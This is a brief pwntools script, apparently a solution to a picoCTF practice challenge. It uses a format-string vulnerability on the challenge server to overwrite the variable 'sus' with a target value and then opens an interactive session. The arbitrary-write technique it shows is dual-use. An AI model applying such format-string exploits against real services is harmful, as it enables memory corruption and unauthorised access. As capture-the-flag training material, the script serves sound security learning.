#solution to https://play.picoctf.org/practice/challenge/448
from pwn import *
conn = remote("rhea.picoctf.net",58089)
context.binary = ELF("vuln")
conn.recvline()
def exec_fmt(payload):
    p = remote("rhea.picoctf.net",58089)
    p.sendline(payload)
    return p.recvall()
fmtstr = FmtStr(exec_fmt)
offset = fmtstr.offset
elf = ELF("vuln")
var = elf.symbols["sus"]
payload = fmtstr_payload(offset, {var:0x67616c66})
conn.sendline(payload)
conn.interactive()
